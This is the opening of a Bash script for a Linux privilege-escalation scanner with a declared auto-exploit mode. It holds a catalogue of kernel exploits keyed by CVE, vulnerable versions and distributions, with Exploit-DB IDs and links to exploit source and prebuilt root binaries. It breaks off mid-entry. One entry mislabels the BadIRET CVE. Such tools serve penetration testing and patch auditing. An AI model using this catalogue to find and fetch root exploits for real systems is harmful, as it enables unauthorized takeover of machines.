#!/bin/bash
# linux-vuln-detector - Linux Privilege Escalation Vulnerability Scanner & Auto-Exploit
# Version: v2.0 - Fixed & Enhanced

VERSION=v2.0

txtred=$'\033[91;1m'
txtgrn=$'\033[1;32m'
txtgray=$'\033[0;37m'
txtblu=$'\033[0;36m'
txtrst=$'\033[0m'
bldwht=$'\033[1;37m'
wht=$'\033[0;36m'
bldblu=$'\033[1;34m'
yellow=$'\033[1;93m'
lightyellow=$'\033[0;93m'

UNAME_A=""
KERNEL=""
KERNEL_ALL=""
OS=""
DISTRO=""
ARCH=""
PKG_LIST=""
KCONFIG=""
CVELIST_FILE=""

opt_fetch_bins=false
opt_fetch_srcs=false
opt_kernel_version=false
opt_uname_string=false
opt_pkglist_file=false
opt_cvelist_file=false
opt_checksec_mode=false
opt_full=false
opt_summary=false
opt_kernel_only=false
opt_userspace_only=false
opt_show_dos=false
opt_skip_more_checks=false
opt_skip_pkg_versions=false
opt_auto_exploit=false

declare -a EXPLOITS
declare -a EXPLOITS_USERSPACE
declare -a exploits_to_sort
declare -a SORTED_EXPLOITS

_ROOT_ACHIEVED=false
_AUTO_EXPLOIT_TRIED=false

n=0

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} elflbl
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/elflbl
exploit-db: 744
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} uselib()
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
exploit-db: 778
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} krad3
Reqs: pkg=linux-kernel,ver>=2.6.5,ver<=2.6.11
Tags:
Rank: 1
exploit-db: 1397
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-0077]${txtrst} mremap_pte
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.2
Tags:
Rank: 1
exploit-db: 160
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} raptor_prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2031
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2004
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl2
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2005
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl3
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2006
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl4
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2011
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-3626]${txtrst} h00lyshit
Reqs: pkg=linux-kernel,ver>=2.6.8,ver<=2.6.16
Tags:
Rank: 1
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/h00lyshit
exploit-db: 2013
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice1
Reqs: pkg=linux-kernel,ver>=2.6.17,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5092
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice2
Reqs: pkg=linux-kernel,ver>=2.6.23,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5093
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-4210]${txtrst} ftrex
Reqs: pkg=linux-kernel,ver>=2.6.11,ver<=2.6.22
Tags:
Rank: 1
exploit-db: 6851
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-4210]${txtrst} exit_notify
Reqs: pkg=linux-kernel,ver>=2.6.25,ver<=2.6.29
Tags:
Rank: 1
exploit-db: 8369
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692]${txtrst} sock_sendpage (simple)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=7.10,RHEL=4,fedora=4|5|6|7|8|9|10|11
Rank: 1
exploit-db: 9479
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=9.04
Rank: 1
analysis-url: https://xorl.wordpress.com/2009/07/16/cve-2009-1895-linux-kernel-per_clear_on_setid-personality-bypass/
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9435.tgz
exploit-db: 9435
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage2
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags:
Rank: 1
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9436.tgz
exploit-db: 9436
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage3
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags:
Rank: 1
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9641.tar.gz
exploit-db: 9641
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage (ppc)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=8.10,RHEL=4|5
Rank: 1
exploit-db: 9545
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} the rebel (udp_sendmsg)
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19
Tags: debian=4
Rank: 1
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/9574.tgz
exploit-db: 9574
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: spender
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} hoagie_udp_sendmsg
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: debian=4
Rank: 1
exploit-db: 9575
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: andi
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} katon (udp_sendmsg)
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: debian=4
Rank: 1
src-url: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack/raw/master/2009/CVE-2009-2698/katon.c
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
author: VxHell Labs
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2698]${txtrst} ip_append_data
Reqs: pkg=linux-kernel,ver>=2.6.1,ver<=2.6.19,x86
Tags: fedora=4|5|6,RHEL=4
Rank: 1
analysis-url: https://blog.cr0.org/2009/08/cve-2009-2698-udpsendmsg-vulnerability.html
exploit-db: 9542
author: p0c73n1
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 1
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 33321
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 2
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 33322
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-3547]${txtrst} pipe.c 3
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.31
Tags:
Rank: 1
exploit-db: 10018
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3301]${txtrst} ptrace_kmod2
Reqs: pkg=linux-kernel,ver>=2.6.26,ver<=2.6.34
Tags: debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}
Rank: 1
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/kmod2
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/ptrace-kmod
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/ptrace_kmod2-64
exploit-db: 15023
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-1146]${txtrst} reiserfs
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.34
Tags: ubuntu=9.10
Rank: 1
analysis-url: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/
src-url: https://jon.oberheide.org/files/team-edward.py
exploit-db: 12130
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-2959]${txtrst} can_bcm
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=2.6.36
Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
Rank: 1
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/can_bcm
exploit-db: 14814
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3904]${txtrst} rds
Reqs: pkg=linux-kernel,ver>=2.6.30,ver<2.6.37
Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
Rank: 1
analysis-url: http://www.securityfocus.com/archive/1/514379
src-url: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds
bin-url: https://web.archive.org/web/20160602192641/https://www.kernel-exploits.com/media/rds64
exploit-db: 15285
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3848,CVE-2010-3850,CVE-2010-4073]${txtrst} half_nelson
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
Rank: 1
bin-url: http://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/half-nelson3
exploit-db: 17787
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[N/A]${txtrst} caps_to_root
Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36,x86
Tags: ubuntu=10.10
Rank: 1
exploit-db: 15916
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[N/A]${txtrst} caps_to_root 2
Reqs: pkg=linux-kernel,ver>=2.6.34,ver<=2.6.36
Tags: ubuntu=10.10
Rank: 1
exploit-db: 15944
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-4347]${txtrst} american-sign-language
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags:
Rank: 1
exploit-db: 15774
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3437]${txtrst} pktcdvd
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=10.04
Rank: 1
exploit-db: 15150
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2010-3081]${txtrst} video4linux
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.33
Tags: RHEL=5
Rank: 1
exploit-db: 15024
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2012-0056]${txtrst} memodipper
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=3.1.0
Tags: ubuntu=(10.04|11.10){kernel:3.0.0-12-(generic|server)}
Rank: 1
analysis-url: https://git.zx2c4.com/CVE-2012-0056/about/
src-url: https://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/memodipper64
exploit-db: 18411
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2012-0056,CVE-2010-3849,CVE-2010-3850]${txtrst} full-nelson
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.36
Tags: ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}
Rank: 1
src-url: http://vulnfactory.org/exploits/full-nelson.c
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/full-nelson64
exploit-db: 15704
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-1858]${txtrst} CLONE_NEWUSER|CLONE_FS
Reqs: pkg=linux-kernel,ver=3.8,CONFIG_USER_NS=y
Tags:
Rank: 1
src-url: http://stealth.openwall.net/xSports/clown-newuser.c
analysis-url: https://lwn.net/Articles/543273/
exploit-db: 38390
author: Sebastian Krahmer
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64
Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/perf_swevent64
exploit-db: 26131
author: Andrea 'sorbo' Bittau
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-2094]${txtrst} perf_swevent 2
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9,x86_64
Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
src-url: https://cyseclabs.com/exploits/vnik_v1.c
exploit-db: 33589
author: Vitaly 'vnik' Nikolenko
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-0268]${txtrst} msr
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<3.7.6
Tags:
Rank: 1
exploit-db: 27297
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-1959]${txtrst} userns_root_sploit
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.8.9
Tags:
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2013/04/29/1
exploit-db: 25450
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2013-2094]${txtrst} semtex
Reqs: pkg=linux-kernel,ver>=2.6.32,ver<3.8.9
Tags: RHEL=6
Rank: 1
analysis-url: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
exploit-db: 25444
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn
Reqs: pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y
Tags: ubuntu=13.10
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/timeoutpwn64
exploit-db: 31346
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0038]${txtrst} timeoutpwn 2
Reqs: pkg=linux-kernel,ver>=3.4.0,ver<=3.13.1,CONFIG_X86_X32=y
Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
exploit-db: 31347
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-0196]${txtrst} rawmodePTY
Reqs: pkg=linux-kernel,ver>=2.6.31,ver<=3.14.3
Tags:
Rank: 1
analysis-url: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
exploit-db: 33516
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-2851]${txtrst} use-after-free in ping_init_sock() ${bldblu}(DoS)${txtrst}
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.14
Tags:
Rank: 0
analysis-url: https://cyseclabs.com/page?n=02012016
exploit-db: 32926
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-4014]${txtrst} inode_capable
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.13
Tags: ubuntu=12.04
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2014/06/10/4
exploit-db: 33824
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-4699]${txtrst} ptrace/sysret
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.8
Tags: ubuntu=12.04
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2014/07/08/16
exploit-db: 34134
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-4943]${txtrst} PPPoL2TP ${bldblu}(DoS)${txtrst}
Reqs: pkg=linux-kernel,ver>=3.2,ver<=3.15.6
Tags:
Rank: 1
analysis-url: https://cyseclabs.com/page?n=01102015
exploit-db: 36267
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2014-5207]${txtrst} fuse_suid
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<=3.16.1
Tags:
Rank: 1
exploit-db: 34923
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-9322]${txtrst} BadIRET
Reqs: pkg=linux-kernel,ver>=3.0.1,ver<3.17.5,x86_64
Tags: RHEL<=7,fedora=20
Rank: 1
analysis-url: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
src-url: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz
exploit-db:
author: Rafal 'n3rgal' Wojtczuk & Adam 'pi3' Zabrocki
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-3290]${txtrst} espfix64_NMI
Reqs: pkg=linux-kernel,ver>=3.13,ver<4.1.6,x86_64
Tags:
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2015/08/04/8
exploit-db: 37722
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[N/A]${txtrst} bluetooth
Reqs: pkg=linux-kernel,ver<=2.6.11
Tags:
Rank: 1
exploit-db: 4756
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-1328]${txtrst} overlayfs
Reqs: pkg=linux-kernel,ver>=3.13.0,ver<=3.19.0
Tags: ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic},ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
Rank: 1
analysis-url: http://seclists.org/oss-sec/2015/q2/717
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_32
bin-url: https://web.archive.org/web/20160602192631/https://www.kernel-exploits.com/media/ofs_64
exploit-db: 37292
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-8660]${txtrst} overlayfs (ovl_setattr)
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3
Tags:
Rank: 1
analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
exploit-db: 39230
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2015-8660]${txtrst} overlayfs (ovl_setattr)
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.3.3
Tags: ubuntu=(14.04|15.10){kernel:4.2.0-(18|19|20|21|22)-generic}
Rank: 1
analysis-url: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
exploit-db: 39166
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-0728]${txtrst} keyring
Reqs: pkg=linux-kernel,ver>=3.10,ver<4.4.1
Tags:
Rank: 0
analysis-url: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
exploit-db: 40003
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-2384]${txtrst} usb-midi
Reqs: pkg=linux-kernel,ver>=3.0.0,ver<=4.4.8
Tags: ubuntu=14.04,fedora=22
Rank: 1
analysis-url: https://xairy.github.io/blog/2016/cve-2016-2384
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
exploit-db: 41999
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-4997]${txtrst} target_offset
Reqs: pkg=linux-kernel,ver>=4.4.0,ver<=4.4.0,cmd:grep -qi ip_tables /proc/modules
Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 1
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/40053.zip
exploit-db: 40049
author: Vitaly 'vnik' Nikolenko
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-4557]${txtrst} double-fdput()
Reqs: pkg=linux-kernel,ver>=4.4,ver<4.5.5,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 1
analysis-url: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
src-url: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
exploit-db: 40759
author: Jann Horn
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-5195]${txtrst} dirtycow
Reqs: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3
Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
Rank: 4
analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
exploit-db: 40611
author: Phil Oester
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-5195]${txtrst} dirtycow 2
Reqs: pkg=linux-kernel,ver>=2.6.22,ver<=4.8.3
Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
Rank: 4
analysis-url: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
ext-url: https://www.exploit-db.com/download/40847
exploit-db: 40839
author: FireFart
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-8655]${txtrst} chocobo_root
Reqs: pkg=linux-kernel,ver>=4.4.0,ver<4.9,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2016/12/06/1
exploit-db: 40871
author: rebel
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2016-9793]${txtrst} SO_{SND|RCV}BUFFORCE
Reqs: pkg=linux-kernel,ver>=3.11,ver<4.8.14,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags:
Rank: 1
analysis-url: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
exploit-db: 41995
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-6074]${txtrst} dccp
Reqs: pkg=linux-kernel,ver>=2.6.18,ver<=4.9.11,CONFIG_IP_DCCP=[my]
Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/02/22/3
exploit-db: 41458
author: Andrey 'xairy' Konovalov
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-7308]${txtrst} af_packet
Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.10.6,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
Rank: 1
analysis-url: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
exploit-db: 41994
author: Andrey 'xairy' Konovalov (orginal); Brendan Coles (update)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-16995]${txtrst} eBPF_verifier
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.14.8,CONFIG_BPF_SYSCALL=y,sysctl:kernel.unprivileged_bpf_disabled!=1
Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
Rank: 5
analysis-url: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
exploit-db: 45010
author: Rick Larabee
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000112]${txtrst} NETIF_F_UFO
Reqs: pkg=linux-kernel,ver>=4.4,ver<=4.13,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1
Tags: ubuntu=14.04{kernel:4.4.0-*},ubuntu=16.04{kernel:4.8.0-*}
Rank: 1
analysis-url: http://www.openwall.com/lists/oss-security/2017/08/13/1
src-url: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
author: Andrey 'xairy' Konovalov (orginal); Brendan Coles (update)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2017-1000253]${txtrst} PIE_stack_corruption
Reqs: pkg=linux-kernel,ver>=3.2,ver<=4.13,x86_64
Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
Rank: 1
analysis-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
src-url: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
exploit-db: 42887
author: Qualys
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2018-5333]${txtrst} rds_atomic_free_op
